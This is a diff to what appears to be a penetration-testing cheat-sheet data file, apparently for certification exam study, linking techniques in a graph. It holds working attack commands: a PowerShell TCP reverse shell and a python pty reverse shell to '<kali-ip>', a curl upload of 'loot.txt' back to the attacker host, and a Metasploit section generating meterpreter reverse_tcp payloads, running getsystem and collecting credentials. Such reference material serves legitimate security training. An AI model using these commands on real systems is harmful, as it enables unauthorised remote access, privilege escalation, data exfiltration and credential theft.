@@ -48,6 +48,12 @@ python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("<kali-ip>",443));
                     code: `powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('<kali-ip>',443);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$s.Write(([text.encoding]::ASCII).GetBytes($sb),0,$sb.Length)}"`,
                     note: 'Base64-encode (-enc) if quoting breaks it through the injection point.',
                 },
+                {
+                    label: 'penelope listener (auto-upgrade)',
+                    code: `penelope 443
+# generates ready-to-paste one-liners (PowerShell base64 / nc / python)
+# and auto-stabilises the TTY once the shell connects`,
+                },
             ],
             references: [
                 {
@@ -163,8 +169,47 @@ copy \\\\<kali-ip>\\share\\linpeas.sh .\\lp.sh
 # tiny file:
 cat file | base64 -w0     # then echo <b64> | base64 -d > file`,
                 },
+                {
+                    label: 'Upload back to Kali (uploadserver)',
+                    code: `# Kali (receives uploads):
+python3 -m uploadserver 80
+# target (uploads):
+curl -X POST http://<kali-ip>/upload -F files=@/path/loot.txt`,
+                },
             ],
             tags: ['transfer', 'wget', 'certutil', 'smbserver', 'iwr'],
+        },
+        {
+            id: 'metasploit',
+            title: 'Metasploit (meterpreter / modules)',
+            type: 'technique',
+            phase: 'shells',
+            os: 'agnostic',
+            description:
+                'When a manual exploit is fiddly, Metasploit gives a reliable payload, process migration and post modules. Check the exam rules on which modules are allowed before reaching for it.',
+            commands: [
+                {
+                    label: 'Handler + payload',
+                    code: `msfconsole -q
+use exploit/multi/handler
+set payload windows/x64/meterpreter/reverse_tcp
+set LHOST <kali-ip>; set LPORT 443
+run`,
+                },
+                {
+                    label: 'Generate a payload',
+                    code: `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<kali-ip> LPORT=443 -f exe -o shell.exe
+msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<kali-ip> LPORT=443 -f elf -o shell.elf`,
+                },
+                {
+                    label: 'Post modules',
+                    code: `# in a meterpreter session:
+getsystem
+run post/multi/recon/local_exploit_suggester
+run post/windows/gather/credentials/credential_collector`,
+                },
+            ],
+            tags: ['metasploit', 'msfvenom', 'meterpreter', 'handler'],
         },
     ],
     edges: [
@@ -178,6 +223,9 @@ cat file | base64 -w0     # then echo <b64> | base64 -d > file`,
         { from: 'foothold-windows', to: 'file-transfer', label: 'need tools' },
         { from: 'foothold-windows', to: 'ad-foothold', label: 'host is domain-joined' },
         { from: 'shell-upgrade', to: 'foothold-linux', label: 'now interactive' },
+        { from: 'foothold-windows', to: 'metasploit', label: 'use MSF for reliability' },
+        { from: 'metasploit', to: 'system-windows', label: 'getsystem / exploit lands' },
+        { from: 'metasploit', to: 'pivot-discovery', label: 'meterpreter routes / new subnet' },
     ],
 }
 
